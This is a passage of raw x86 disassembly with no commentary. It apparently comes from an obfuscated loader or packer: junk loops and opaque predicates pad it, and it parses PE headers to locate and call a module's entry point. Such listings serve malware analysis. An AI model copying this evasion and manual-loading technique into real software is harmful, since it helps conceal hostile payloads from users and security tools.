  409353:	mov    DWORD PTR ds:0x42e872,edx
  409359:	mov    eax,DWORD PTR [ebp-0x1c]
  40935c:	mov    edx,DWORD PTR [ebp-0xc]
  40935f:	and    DWORD PTR ds:0x42ef2c,0x0
  409369:	mov    edi,DWORD PTR ds:0x42ef2c
  40936f:	inc    edi
  409370:	mov    DWORD PTR ds:0x42ef2c,edi
  409376:	cmp    DWORD PTR ds:0x42ef2c,0x6
  40937d:	jne    0x409391
  409383:	push   DWORD PTR [ebp-0x10]
  409386:	push   0x42e866
  40938b:	call   DWORD PTR ds:0x42ecb4
  409391:	cmp    DWORD PTR ds:0x42ef2c,0x5
  409398:	jne    0x4093ad
  40939e:	xor    edi,edi
  4093a0:	xor    edi,DWORD PTR ds:0x42ef2c
  4093a6:	inc    edi
  4093a7:	mov    DWORD PTR ds:0x42ef2c,edi
  4093ad:	cmp    DWORD PTR ds:0x42ef2c,0x1b
  4093b4:	jb     0x409369
  4093ba:	xor    DWORD PTR ds:0x4305b2,0x56f9
  4093c4:	xor    eax,esi
  4093c6:	and    DWORD PTR ds:0x42ef28,0x0
  4093d0:	jmp    0x4093e2
  4093d5:	mov    edi,DWORD PTR ds:0x42ef28
  4093db:	inc    edi
  4093dc:	mov    DWORD PTR ds:0x42ef28,edi
  4093e2:	cmp    DWORD PTR ds:0x42ef28,0x1f
  4093e9:	jae    0x40946a
  4093ef:	cmp    DWORD PTR ds:0x42ef28,0x6
  4093f6:	jne    0x409402
  4093fc:	call   DWORD PTR ds:0x42ebd0
  409402:	cmp    DWORD PTR ds:0x42ef28,0x5
  409409:	jne    0x40941c
  40940f:	mov    edi,DWORD PTR ds:0x42ef28
  409415:	inc    edi
  409416:	mov    DWORD PTR ds:0x42ef28,edi
  40941c:	jmp    0x4093d5
  409421:	mov    DWORD PTR ds:0x42ef0c,0x12
  40942b:	cmp    DWORD PTR ds:0x42ef0c,0x0
  409432:	je     0x40946a
  409438:	cmp    DWORD PTR ds:0x42ef0c,0x21
  40943f:	jne    0x409450
  409445:	push   0x79c1
  40944a:	call   DWORD PTR ds:0x42ebb4
  409450:	xor    edi,edi
  409452:	or     edi,DWORD PTR ds:0x42ef0c
  409458:	dec    edi
  409459:	mov    DWORD PTR ds:0x42ef0c,edi
  40945f:	jmp    0x40942b
  409464:	and    edi,DWORD PTR ds:0x43065a
  40946a:	add    eax,ebx
  40946c:	mov    DWORD PTR [edx],eax
  40946e:	lea    eax,[ebp-0x14]
  409471:	and    edi,DWORD PTR ds:0x43058a
  409477:	mov    DWORD PTR [ebp-0x44],eax
  40947a:	mov    edi,DWORD PTR ds:0x43059e
  409480:	adc    edi,DWORD PTR ds:0x42ef18
  409486:	mov    DWORD PTR ds:0x43059e,edi
  40948c:	mov    eax,DWORD PTR [ebp-0x1c]
  40948f:	sbb    DWORD PTR ds:0x42ef30,0x42e86a
  409499:	mov    edx,DWORD PTR [ebp-0x44]
  40949c:	sbb    DWORD PTR ds:0x42ef20,0x4305ba
  4094a6:	xor    eax,esi
  4094a8:	add    eax,ebx
  4094aa:	movzx  edi,WORD PTR ds:0x4305c2
  4094b1:	and    DWORD PTR ds:0x4305be,edi
  4094b7:	mov    DWORD PTR [edx],eax
  4094b9:	add    DWORD PTR ds:0x42e876,0x43059a
  4094c3:	mov    DWORD PTR [ebp-0x54],ecx
  4094c6:	or     edi,edi
  4094c8:	lea    eax,[ebp-0x54]
  4094cb:	mov    DWORD PTR [ebp-0x10],eax
  4094ce:	sub    ecx,DWORD PTR ds:0x4305a6
  4094d4:	mov    eax,DWORD PTR [ebp-0x54]
  4094d7:	mov    ecx,DWORD PTR [ebp-0x10]
  4094da:	mov    DWORD PTR ds:0x42ef2c,0x1c
  4094e4:	cmp    DWORD PTR ds:0x42ef2c,0x0
  4094eb:	je     0x409533
  4094f1:	cmp    DWORD PTR ds:0x42ef2c,0x27
  4094f8:	jne    0x40950c
  4094fe:	push   DWORD PTR [ebp-0x20]
  409501:	push   0x215b
  409506:	call   DWORD PTR ds:0x42ecb8
  40950c:	xor    edi,edi
  40950e:	xor    edi,DWORD PTR ds:0x42ef2c
  409514:	dec    edi
  409515:	mov    DWORD PTR ds:0x42ef2c,edi
  40951b:	jmp    0x4094e4
  409520:	movzx  edi,BYTE PTR ds:0x42e86a
  409527:	or     edi,DWORD PTR ds:0x43063e
  40952d:	mov    DWORD PTR ds:0x42e86a,edi
  409533:	xor    eax,esi
  409535:	xor    edi,0xc6b
  40953b:	add    eax,0x32729d
  409540:	mov    DWORD PTR [ecx],eax
  409542:	mov    eax,ds:0x41227c
  409547:	sbb    DWORD PTR ds:0x4305a2,0x6967
  409551:	mov    DWORD PTR [ebp-0x28],0x8e12febc
  409558:	mov    edi,DWORD PTR ds:0x43059a
  40955e:	sbb    DWORD PTR ds:0x42ef0c,edi
  409564:	mov    eax,DWORD PTR [eax]
  409566:	mov    DWORD PTR ds:0x42ef24,0x19
  409570:	cmp    DWORD PTR ds:0x42ef24,0x0
  409577:	je     0x40961e
  40957d:	cmp    DWORD PTR ds:0x42ef24,0x29
  409584:	jne    0x4095c1
  40958a:	push   DWORD PTR [ebp-0xc]
  40958d:	push   DWORD PTR [ebp-0x1c]
  409590:	push   0x61da
  409595:	push   DWORD PTR [ebp-0xc]
  409598:	push   DWORD PTR [ebp-0x1c]
  40959b:	push   DWORD PTR [ebp-0x20]
  40959e:	push   DWORD PTR [ebp-0x1c]
  4095a1:	push   DWORD PTR [ebp-0x28]
  4095a4:	push   0x400000
  4095a9:	push   DWORD PTR [ebp-0xc]
  4095ac:	push   0x2e1f
  4095b1:	push   0x5a6c
  4095b6:	push   0x7112
  4095bb:	call   DWORD PTR ds:0x42ebb8
  4095c1:	xor    edi,edi
  4095c3:	xor    edi,DWORD PTR ds:0x42ef24
  4095c9:	dec    edi
  4095ca:	mov    DWORD PTR ds:0x42ef24,edi
  4095d0:	jmp    0x409570
  4095d5:	and    DWORD PTR ds:0x42e85e,0x0
  4095df:	jmp    0x4095f1
  4095e4:	mov    edi,DWORD PTR ds:0x42e85e
  4095ea:	inc    edi
  4095eb:	mov    DWORD PTR ds:0x42e85e,edi
  4095f1:	cmp    DWORD PTR ds:0x42e85e,0x18
  4095f8:	jae    0x40961e
  4095fe:	cmp    DWORD PTR ds:0x42e85e,0x1f
  409605:	jne    0x409619
  40960b:	push   0x6de3
  409610:	push   DWORD PTR [ebp-0x28]
  409613:	call   DWORD PTR ds:0x42ecbc
  409619:	jmp    0x4095e4
  40961e:	mov    cx,WORD PTR [ebp-0x14]
  409622:	movzx  ecx,cx
  409625:	add    ecx,DWORD PTR [eax]
  409627:	xor    eax,eax
  409629:	mov    DWORD PTR [ebp-0x34],0xf89c8531
  409630:	mov    DWORD PTR [ebp-0x10],ecx
  409633:	mov    edi,0x5a3fc9c
  409638:	add    DWORD PTR ds:0x42e862,edx
  40963e:	mov    eax,DWORD PTR [ebp-0x1c]
  409641:	xor    ecx,ecx
  409643:	xor    ecx,DWORD PTR ds:0x4305a2
  409649:	sub    DWORD PTR ds:0x43058a,ecx
  40964f:	mov    ecx,DWORD PTR [ebp-0xc]
  409652:	or     DWORD PTR ds:0x42ef2c,0x4305a2
  40965c:	xor    eax,esi
  40965e:	mov    DWORD PTR ds:0x4305aa,0x4c41
  409668:	add    eax,ebx
  40966a:	mov    DWORD PTR ds:0x42e86e,0x490b
  409674:	cmp    DWORD PTR [ecx],eax
  409676:	jne    0x409a49
  40967c:	mov    DWORD PTR ds:0x42e85e,0x1f
  409686:	cmp    DWORD PTR ds:0x42e85e,0x0
  40968d:	je     0x40972a
  409693:	cmp    DWORD PTR ds:0x42e85e,0xb
  40969a:	jne    0x4096b3
  4096a0:	push   DWORD PTR [ebp-0xc]
  4096a3:	push   0x6e82
  4096a8:	push   0x1d82
  4096ad:	call   DWORD PTR ds:0x42ebd4
  4096b3:	cmp    DWORD PTR ds:0x42e85e,0xc
  4096ba:	jne    0x4096cb
  4096c0:	mov    eax,ds:0x42e85e
  4096c5:	dec    eax
  4096c6:	mov    ds:0x42e85e,eax
  4096cb:	mov    eax,ds:0x42e85e
  4096d0:	dec    eax
  4096d1:	mov    ds:0x42e85e,eax
  4096d6:	jmp    0x409686
  4096db:	and    DWORD PTR ds:0x42ef24,0x0
  4096e5:	jmp    0x4096f7
  4096ea:	mov    ecx,DWORD PTR ds:0x42ef24
  4096f0:	inc    ecx
  4096f1:	mov    DWORD PTR ds:0x42ef24,ecx
  4096f7:	cmp    DWORD PTR ds:0x42ef24,0x11
  4096fe:	jae    0x40972a
  409704:	cmp    DWORD PTR ds:0x42ef24,0x1a
  40970b:	jne    0x40971f
  409711:	push   0x430592
  409716:	push   DWORD PTR [ebp-0x1c]
  409719:	call   DWORD PTR ds:0x42ecc0
  40971f:	jmp    0x4096ea
  409724:	or     ecx,DWORD PTR ds:0x43058a
  40972a:	mov    eax,DWORD PTR [ebp-0x1c]
  40972d:	mov    DWORD PTR ds:0x42ef14,0x1a
  409737:	cmp    DWORD PTR ds:0x42ef14,0x0
  40973e:	je     0x40977d
  409744:	cmp    DWORD PTR ds:0x42ef14,0x29
  40974b:	jne    0x409769
  409751:	push   0x6cb7
  409756:	push   DWORD PTR [ebp-0x20]
  409759:	push   0x3e46
  40975e:	push   0x42ef2c
  409763:	call   DWORD PTR ds:0x42ecc4
  409769:	xor    ecx,ecx
  40976b:	or     ecx,DWORD PTR ds:0x42ef14
  409771:	dec    ecx
  409772:	mov    DWORD PTR ds:0x42ef14,ecx
  409778:	jmp    0x409737
  40977d:	mov    ecx,DWORD PTR [ebp-0x10]
  409780:	xor    eax,esi
  409782:	adc    DWORD PTR ds:0x4305ae,0x39c3
  40978c:	add    eax,ebx
  40978e:	mov    DWORD PTR ds:0x43064e,0x5e01
  409798:	cmp    DWORD PTR [ecx],eax
  40979a:	jne    0x4098a3
  4097a0:	xor    ecx,ecx
  4097a2:	add    ecx,DWORD PTR ds:0x42ef18
  4097a8:	sub    DWORD PTR ds:0x42e862,ecx
  4097ae:	mov    eax,DWORD PTR [ebp-0x1c]
  4097b1:	xor    ecx,ecx
  4097b3:	mov    ecx,DWORD PTR [ebp-0x44]
  4097b6:	inc    DWORD PTR ds:0x430646
  4097bc:	xor    eax,esi
  4097be:	and    DWORD PTR ds:0x42e85a,0x0
  4097c8:	mov    edx,DWORD PTR ds:0x42e85a
  4097ce:	inc    edx
  4097cf:	mov    DWORD PTR ds:0x42e85a,edx
  4097d5:	cmp    DWORD PTR ds:0x42e85a,0x11
  4097dc:	jne    0x4097f0
  4097e2:	push   0x430656
  4097e7:	push   DWORD PTR [ebp-0x10]
  4097ea:	call   DWORD PTR ds:0x42ebd8
  4097f0:	cmp    DWORD PTR ds:0x42e85a,0x10
  4097f7:	jne    0x40980a
  4097fd:	mov    edx,DWORD PTR ds:0x42e85a
  409803:	inc    edx
  409804:	mov    DWORD PTR ds:0x42e85a,edx
  40980a:	cmp    DWORD PTR ds:0x42e85a,0x1c
  409811:	jb     0x4097c8
  409817:	add    eax,ebx
  409819:	sbb    edx,0x5b8
  40981f:	mov    DWORD PTR [ecx],eax
  409821:	mov    DWORD PTR ds:0x430642,0x1c
  40982b:	cmp    DWORD PTR ds:0x430642,0x0
  409832:	je     0x40987c
  409838:	cmp    DWORD PTR ds:0x430642,0xd
  40983f:	jne    0x409850
  409845:	push   0x4366
  40984a:	call   DWORD PTR ds:0x42ecc8
  409850:	cmp    DWORD PTR ds:0x430642,0xe
  409857:	jne    0x40986a
  40985d:	mov    edx,DWORD PTR ds:0x430642
  409863:	dec    edx
  409864:	mov    DWORD PTR ds:0x430642,edx
  40986a:	mov    edx,DWORD PTR ds:0x430642
  409870:	dec    edx
  409871:	mov    DWORD PTR ds:0x430642,edx
  409877:	jmp    0x40982b
  40987c:	mov    eax,DWORD PTR [ebp-0x44]
  40987f:	mov    ecx,DWORD PTR [ebp-0x34]
  409882:	adc    DWORD PTR ds:0x42ef14,ebx
  409888:	xor    ecx,esi
  40988a:	xor    DWORD PTR ds:0x43064a,edi
  409890:	mov    edx,0xffcd8d63
  409895:	and    DWORD PTR ds:0x4305a2,0x42e872
  40989f:	sub    edx,ecx
  4098a1:	add    DWORD PTR [eax],edx
  4098a3:	and    DWORD PTR ds:0x4305ba,0x0
  4098ad:	jmp    0x4098bd
  4098b2:	mov    eax,ds:0x4305ba
  4098b7:	inc    eax
  4098b8:	mov    ds:0x4305ba,eax
  4098bd:	cmp    DWORD PTR ds:0x4305ba,0x11
  4098c4:	jae    0x40990a
  4098ca:	cmp    DWORD PTR ds:0x4305ba,0xb
  4098d1:	jne    0x4098eb
  4098d7:	push   DWORD PTR [ebp-0x14]
  4098da:	push   DWORD PTR [ebp-0x10]
  4098dd:	push   0x45e3
  4098e2:	push   DWORD PTR [ebp-0x1c]
  4098e5:	call   DWORD PTR ds:0x42eccc
  4098eb:	cmp    DWORD PTR ds:0x4305ba,0xa
  4098f2:	jne    0x409903
  4098f8:	mov    eax,ds:0x4305ba
  4098fd:	inc    eax
  4098fe:	mov    ds:0x4305ba,eax
  409903:	jmp    0x4098b2
  409908:	not    eax
  40990a:	mov    eax,ds:0x41227c
  40990f:	mov    eax,DWORD PTR [eax]
  409911:	sub    DWORD PTR ds:0x4305c2,0x4305a6
  40991b:	mov    cx,WORD PTR [ebp-0x14]
  40991f:	and    DWORD PTR ds:0x42ef1c,0x42e86e
  409929:	movzx  ecx,cx
  40992c:	add    ecx,DWORD PTR [eax]
  40992e:	and    DWORD PTR ds:0x42ef14,0x0
  409938:	jmp    0x40994b
  40993d:	xor    eax,eax
  40993f:	add    eax,DWORD PTR ds:0x42ef14
  409945:	inc    eax
  409946:	mov    ds:0x42ef14,eax
  40994b:	cmp    DWORD PTR ds:0x42ef14,0x1d
  409952:	jae    0x409980
  409958:	cmp    DWORD PTR ds:0x42ef14,0x1f
  40995f:	jne    0x409975
  409965:	push   0x887a
  40996a:	push   0x3c32
  40996f:	call   DWORD PTR ds:0x42ebe0
  409975:	jmp    0x40993d
  40997a:	adc    eax,DWORD PTR ds:0x43059e
  409980:	mov    DWORD PTR [ebp-0x10],ecx
  409983:	sub    DWORD PTR ds:0x42e85e,0x488b
  40998d:	mov    eax,DWORD PTR [ebp-0x30]
  409990:	xor    ecx,ecx
  409992:	add    ecx,DWORD PTR ds:0x4305c2
  409998:	xor    ecx,DWORD PTR ds:0x4305be
  40999e:	mov    DWORD PTR ds:0x4305c2,ecx
  4099a4:	mov    ecx,DWORD PTR [ebp-0x30]
  4099a7:	xor    eax,esi
  4099a9:	sbb    DWORD PTR ds:0x4305b6,0x42ef14
  4099b3:	add    eax,eax
  4099b5:	and    DWORD PTR ds:0x42e86a,0x42ef08
  4099bf:	xor    ecx,esi
  4099c1:	sub    DWORD PTR ds:0x4305ba,0x1a55
  4099cb:	sub    ecx,eax
  4099cd:	or     DWORD PTR ds:0x4305b2,0x4305c2
  4099d7:	mov    ax,WORD PTR [ebp-0x14]
  4099db:	sub    DWORD PTR ds:0x42e85e,0x42e86a
  4099e5:	movzx  eax,ax
  4099e8:	sub    ecx,ebx
  4099ea:	mov    DWORD PTR ds:0x42e872,0x4be2
  4099f4:	cmp    eax,ecx
  4099f6:	mov    DWORD PTR ds:0x430646,0x6841
  409a00:	mov    eax,DWORD PTR [ebp-0x34]
  409a03:	movzx  ecx,WORD PTR [ebp-0x14]
  409a07:	mov    DWORD PTR ds:0x42e85a,0x46e
  409a11:	jg     0x409a30
  409a17:	xor    eax,esi
  409a19:	sub    ecx,eax
  409a1b:	adc    DWORD PTR ds:0x430586,0x430652
  409a25:	sub    ecx,ebx
  409a27:	mov    WORD PTR [ebp-0x14],cx
  409a2b:	jmp    0x409a49
  409a30:	not    DWORD PTR ds:0x42e85e
  409a36:	xor    eax,esi
  409a38:	lea    eax,[eax+ecx*1+0x32729d]
  409a3f:	mov    DWORD PTR ds:0x43065a,ebx
  409a45:	mov    WORD PTR [ebp-0x14],ax
  409a49:	mov    ecx,DWORD PTR [ebp-0x28]
  409a4c:	not    eax
  409a4e:	mov    eax,0x8e12febc
  409a53:	mov    DWORD PTR ds:0x42e86e,0x41a
  409a5d:	cmp    ecx,eax
  409a5f:	mov    DWORD PTR ds:0x42e86e,0x60ce
  409a69:	je     0x409a9b
  409a6f:	mov    DWORD PTR ds:0x42ef10,0x7d2b
  409a79:	mov    eax,DWORD PTR [ebp-0xc]
  409a7c:	mov    DWORD PTR ds:0x43059a,0x4b8f
  409a86:	mov    DWORD PTR [eax],0x60341e8d
  409a8c:	mov    DWORD PTR ds:0x42e85e,0x3193
  409a96:	jmp    0x409daf
  409a9b:	mov    ecx,DWORD PTR [ebp-0x28]
  409a9e:	cmp    ecx,0x5142ddba
  409aa4:	jne    0x409bad
  409aaa:	mov    DWORD PTR ds:0x43064e,ecx
  409ab0:	mov    eax,DWORD PTR [ebp-0xc]
  409ab3:	mov    DWORD PTR ds:0x4305be,0x644d
  409abd:	mov    DWORD PTR [eax],0x4214feba
  409ac3:	mov    eax,DWORD PTR [ebp-0xc]
  409ac6:	mov    DWORD PTR ds:0x43065a,0x1ed6
  409ad0:	mov    DWORD PTR [ebp-0x4],eax
  409ad3:	mov    DWORD PTR ds:0x43064a,edx
  409ad9:	mov    eax,DWORD PTR [ebp-0x30]
  409adc:	mov    eax,DWORD PTR [ebp-0x1c]
  409adf:	mov    DWORD PTR [ebp-0x4c],edi
  409ae2:	mov    eax,0xff7
  409ae7:	mov    eax,DWORD PTR [ebp-0x4c]
  409aea:	mov    DWORD PTR [ebp-0x8],0x4eb9
  409af1:	cmp    eax,edi
  409af3:	mov    DWORD PTR ds:0x430652,0x7826
  409afd:	jne    0x409daf
  409b03:	add    DWORD PTR ds:0x42ef0c,0x42e85e
  409b0d:	mov    ax,WORD PTR [ebp-0x8]
  409b11:	sbb    ecx,DWORD PTR ds:0x4305ba
  409b17:	mov    ecx,0x8a40
  409b1c:	xor    ax,cx
  409b1f:	xor    ecx,DWORD PTR ds:0x42ef0c
  409b25:	mov    ecx,0x3b06
  409b2a:	add    ax,cx
  409b2d:	mov    ecx,DWORD PTR [ebp-0x4]
  409b30:	movzx  eax,ax
  409b33:	sub    DWORD PTR ds:0x430646,0x42ef28
  409b3d:	not    eax
  409b3f:	sbb    DWORD PTR ds:0x42e86a,0x43059a
  409b49:	and    eax,DWORD PTR [ecx]
  409b4b:	mov    ecx,DWORD PTR [ebp-0x4]
  409b4e:	mov    DWORD PTR ds:0x4305aa,0x2700
  409b58:	mov    DWORD PTR [ecx],eax
  409b5a:	jmp    0x409b70
  409b5f:	and    DWORD PTR ds:0x42e85e,0x43064e
  409b69:	xor    DWORD PTR [ebp-0x4c],0xe149ebc
  409b70:	mov    ax,WORD PTR [ebp-0x8]
  409b74:	not    DWORD PTR ds:0x4305c2
  409b7a:	push   DWORD PTR [ebp-0x4]
  409b7d:	adc    DWORD PTR ds:0x42ef28,0x430596
  409b87:	call   0x401000
  409b8c:	xor    DWORD PTR ds:0x42ef24,0x7536
  409b96:	test   eax,eax
  409b98:	mov    DWORD PTR ds:0x430586,0x7cfd
  409ba2:	je     0x409b5f
  409ba8:	jmp    0x409daf
  409bad:	movzx  ecx,WORD PTR ds:0x430596
  409bb4:	mov    ecx,DWORD PTR [ebp-0x28]
  409bb7:	cmp    ecx,0x1443fcbd
  409bbd:	jne    0x409bef
  409bc3:	mov    DWORD PTR ds:0x4305a2,0x6608
  409bcd:	mov    eax,DWORD PTR [ebp-0xc]
  409bd0:	mov    DWORD PTR ds:0x43058e,0x8ce
  409bda:	mov    DWORD PTR [eax],0x60062d8f
  409be0:	mov    DWORD PTR ds:0x4305ba,0x323c
  409bea:	jmp    0x409daf
  409bef:	mov    DWORD PTR ds:0x4305a2,0x6595
  409bf9:	mov    ecx,DWORD PTR [ebp-0x28]
  409bfc:	mov    DWORD PTR ds:0x42e876,0x5912
  409c06:	cmp    ecx,eax
  409c08:	jne    0x409d34
  409c0e:	sbb    DWORD PTR ds:0x4305be,edx
  409c14:	mov    eax,DWORD PTR [ebp-0x1c]
  409c17:	and    DWORD PTR ds:0x430642,0x28ff
  409c21:	mov    ecx,DWORD PTR [ebp-0xc]
  409c24:	mov    DWORD PTR ds:0x430646,0x5e2a
  409c2e:	xor    eax,esi
  409c30:	xor    DWORD PTR ds:0x430646,0x42ef0c
  409c3a:	add    eax,ebx
  409c3c:	cmp    DWORD PTR [ecx],eax
  409c3e:	je     0x409cc1
  409c44:	mov    ecx,DWORD PTR [ebp-0x54]
  409c47:	mov    eax,DWORD PTR [ebp-0xc]
  409c4a:	mov    eax,DWORD PTR [eax]
  409c4c:	mov    eax,DWORD PTR [eax+0x3c]
  409c4f:	lea    ecx,[ecx*8+0x78]
  409c56:	add    eax,ecx
  409c58:	mov    ecx,DWORD PTR [ebp-0xc]
  409c5b:	mov    ecx,DWORD PTR [ecx]
  409c5d:	mov    eax,DWORD PTR [eax+ecx*1]
  409c60:	mov    DWORD PTR [ebp-0x8],eax
  409c63:	mov    eax,DWORD PTR [ebp-0x1c]
  409c66:	xor    eax,esi
  409c68:	add    eax,ebx
  409c6a:	mov    DWORD PTR [ebp-0x4],eax
  409c6d:	mov    eax,DWORD PTR [ebp-0x1c]
  409c70:	mov    ecx,DWORD PTR [ebp-0x8]
  409c73:	xor    eax,esi
  409c75:	add    eax,ebx
  409c77:	cmp    ecx,eax
  409c79:	je     0x409daf
  409c7f:	mov    eax,DWORD PTR [ebp-0xc]
  409c82:	mov    ecx,DWORD PTR [ebp-0x8]
  409c85:	add    ecx,DWORD PTR [eax]
  409c87:	mov    DWORD PTR [ebp-0x4],ecx
  409c8a:	mov    eax,DWORD PTR [ebp-0x4]
  409c8d:	mov    ecx,DWORD PTR [ebp-0xc]
  409c90:	mov    eax,DWORD PTR [eax+0xc]
  409c93:	mov    ecx,DWORD PTR [ecx]
  409c95:	mov    al,BYTE PTR [eax+ecx*1]
  409c98:	add    al,0x36
  409c9a:	xor    al,0x48
  409c9c:	cmp    al,0xc9
  409c9e:	je     0x409cb5
  409ca4:	mov    eax,DWORD PTR [ebp-0x1c]
  409ca7:	mov    ecx,DWORD PTR [ebp-0xc]
  409caa:	xor    eax,esi
  409cac:	add    eax,ebx
  409cae:	mov    DWORD PTR [ecx],eax
  409cb0:	jmp    0x409daf
  409cb5:	xor    DWORD PTR [ebp-0x28],0x5fd8f
  409cbc:	jmp    0x409daf
  409cc1:	mov    eax,DWORD PTR [ebp-0xc]
  409cc4:	mov    ecx,DWORD PTR [ebp-0x10]
  409cc7:	mov    ecx,DWORD PTR [ecx]
  409cc9:	mov    DWORD PTR [eax],ecx
  409ccb:	mov    eax,DWORD PTR [ebp-0xc]
  409cce:	mov    DWORD PTR [ebp-0x4],eax
  409cd1:	mov    eax,DWORD PTR [ebp-0x30]
  409cd4:	mov    eax,DWORD PTR [ebp-0x1c]
  409cd7:	mov    DWORD PTR [ebp-0x5c],edi
  409cda:	mov    eax,DWORD PTR [ebp-0x5c]
  409cdd:	mov    DWORD PTR [ebp-0x8],0x4eb9
  409ce4:	cmp    eax,edi
  409ce6:	jne    0x409daf
  409cec:	mov    ax,WORD PTR [ebp-0x8]
  409cf0:	mov    ecx,0x8a40
  409cf5:	xor    ax,cx
  409cf8:	mov    ecx,0x3b06
  409cfd:	add    ax,cx
  409d00:	mov    ecx,DWORD PTR [ebp-0x4]
  409d03:	movzx  eax,ax
  409d06:	not    eax
  409d08:	and    eax,DWORD PTR [ecx]
  409d0a:	mov    ecx,DWORD PTR [ebp-0x4]
  409d0d:	mov    DWORD PTR [ecx],eax
  409d0f:	jmp    0x409d1b
  409d14:	xor    DWORD PTR [ebp-0x5c],0xe149ebc
  409d1b:	mov    ax,WORD PTR [ebp-0x8]
  409d1f:	push   DWORD PTR [ebp-0x4]
  409d22:	call   0x401000
  409d27:	test   eax,eax
  409d29:	je     0x409d14
  409d2f:	jmp    0x409daf
  409d34:	mov    eax,DWORD PTR [ebp-0x28]
  409d37:	cmp    eax,0x33450cad
  409d3c:	jne    0x409daf
  409d42:	mov    eax,DWORD PTR [ebp-0xc]
  409d45:	mov    DWORD PTR [eax],0x443dc9d
  409d4b:	mov    eax,DWORD PTR [ebp-0xc]
  409d4e:	mov    DWORD PTR [ebp-0x4],eax
  409d51:	mov    eax,DWORD PTR [ebp-0x30]
  409d54:	mov    eax,DWORD PTR [ebp-0x1c]
  409d57:	mov    DWORD PTR [ebp-0x40],edi
  409d5a:	mov    eax,DWORD PTR [ebp-0x40]
  409d5d:	mov    DWORD PTR [ebp-0x8],0x4eb9
  409d64:	cmp    eax,edi
  409d66:	jne    0x409daf
  409d6c:	mov    ax,WORD PTR [ebp-0x8]
  409d70:	mov    ecx,0x8a40
  409d75:	xor    ax,cx
  409d78:	mov    ecx,0x3b06
  409d7d:	add    ax,cx
  409d80:	mov    ecx,DWORD PTR [ebp-0x4]
  409d83:	movzx  eax,ax
  409d86:	not    eax
  409d88:	and    eax,DWORD PTR [ecx]
  409d8a:	mov    ecx,DWORD PTR [ebp-0x4]
  409d8d:	mov    DWORD PTR [ecx],eax
  409d8f:	jmp    0x409d9b
  409d94:	xor    DWORD PTR [ebp-0x40],0xe149ebc
  409d9b:	mov    ax,WORD PTR [ebp-0x8]
  409d9f:	push   DWORD PTR [ebp-0x4]
  409da2:	call   0x401000
  409da7:	test   eax,eax
  409da9:	je     0x409d94
  409daf:	mov    eax,DWORD PTR [ebp-0x28]
  409db2:	cmp    eax,0x8e12febc
  409db7:	je     0x409638
  409dbd:	mov    eax,DWORD PTR [ebp-0xc]
  409dc0:	mov    eax,ds:0x4121a8
  409dc5:	mov    eax,DWORD PTR [eax+0x18c]
  409dcb:	mov    eax,DWORD PTR [eax]
  409dcd:	mov    DWORD PTR [ebp-0x74],eax
  409dd0:	mov    eax,0xf89c8531
  409dd5:	mov    DWORD PTR [ebp-0x10],eax
  409dd8:	mov    DWORD PTR [ebp-0x10],eax
  409ddb:	mov    DWORD PTR [ebp-0x10],eax
  409dde:	mov    DWORD PTR [ebp-0x10],0xf89c8535
  409de5:	mov    DWORD PTR [ebp-0x8],eax
  409de8:	mov    DWORD PTR [ebp-0x8],0xf89c853d
  409def:	mov    edi,DWORD PTR [ebp-0x20]
  409df2:	xor    edi,esi
  409df4:	add    edi,ebx
  409df6:	jmp    0x409e31
  409dfb:	mov    eax,DWORD PTR [ebp-0x18]
  409dfe:	xor    eax,esi
  409e00:	lea    eax,[eax+edi*1+0x32729d]
  409e07:	push   eax
  409e08:	mov    eax,DWORD PTR [ebp-0x10]
  409e0b:	xor    eax,esi
  409e0d:	lea    eax,[ebp+eax*1+0x3272a5]
  409e14:	push   eax
  409e15:	mov    eax,ds:0x4121a8
  409e1a:	push   DWORD PTR [eax+0x1bc]
  409e20:	call   0x4052e7
  409e25:	mov    eax,DWORD PTR [ebp-0x18]
  409e28:	xor    eax,esi
  409e2a:	lea    edi,[edi+eax*1+0x32729d]
  409e31:	mov    eax,DWORD PTR [ebp-0x18]
  409e34:	mov    ecx,DWORD PTR [ebp-0x18]
  409e37:	xor    ecx,esi
  409e39:	xor    eax,esi
  409e3b:	add    eax,ecx
  409e3d:	mov    ecx,DWORD PTR [ebp-0x18]
  409e40:	xor    ecx,esi
  409e42:	lea    eax,[eax+ecx*1+0x9757d7]
  409e49:	cmp    edi,eax
  409e4b:	jbe    0x409dfb
  409e51:	mov    eax,DWORD PTR [ebp+0xc]
  409e54:	mov    ds:0x41202c,eax
  409e59:	mov    eax,DWORD PTR [ebp+0x10]
  409e5c:	mov    ds:0x412280,eax
  409e61:	mov    eax,ds:0x41202c
  409e66:	mov    ecx,DWORD PTR [ebp-0x60]
  409e69:	sub    eax,ebx
  409e6b:	xor    eax,esi
  409e6d:	mov    DWORD PTR [ecx],eax
  409e6f:	mov    eax,DWORD PTR [ebp-0x58]
  409e72:	cmp    eax,0xf89c8532
  409e77:	je     0x409ed4
  409e7d:	mov    eax,DWORD PTR [ebp-0x20]
  409e80:	mov    ecx,DWORD PTR [ebp-0x50]
  409e83:	xor    eax,esi
  409e85:	add    eax,ebx
  409e87:	cmp    eax,ecx
  409e89:	je     0x409ed4
  409e8f:	mov    eax,ds:0x4121a8
  409e94:	mov    eax,DWORD PTR [eax+0x194]
  409e9a:	mov    ecx,DWORD PTR [eax]
  409e9c:	mov    eax,DWORD PTR [ecx+0x3c]
  409e9f:	push   DWORD PTR ds:0x412280
  409ea5:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  409ea9:	push   DWORD PTR ds:0x41202c
  409eaf:	add    eax,ecx
  409eb1:	mov    ecx,DWORD PTR ds:0x4121a8
  409eb7:	mov    ecx,DWORD PTR [ecx+0x194]
  409ebd:	push   DWORD PTR [ecx]
  409ebf:	call   eax
  409ec1:	mov    ecx,DWORD PTR ds:0x4121a8
  409ec7:	mov    ecx,DWORD PTR [ecx+0x1cc]
  409ecd:	mov    DWORD PTR [ecx],eax
  409ecf:	jmp    0x40a18e
  409ed4:	mov    eax,DWORD PTR [ebp-0x20]
  409ed7:	mov    ecx,DWORD PTR [ebp-0x74]
  409eda:	xor    eax,esi
  409edc:	add    eax,ebx
  409ede:	mov    edi,0xf89c85f5
  409ee3:	cmp    eax,ecx
  409ee5:	jne    0x409fe6
  409eeb:	mov    eax,DWORD PTR [ebp-0x20]
  409eee:	xor    eax,esi
  409ef0:	add    eax,ebx
  409ef2:	mov    ds:0x41222c,eax
  409ef7:	mov    eax,DWORD PTR [ebp-0x20]
  409efa:	xor    eax,esi
  409efc:	add    eax,ebx
  409efe:	mov    ds:0x412224,eax
  409f03:	mov    eax,DWORD PTR [ebp-0x18]
  409f06:	mov    DWORD PTR [ebp-0x8],eax
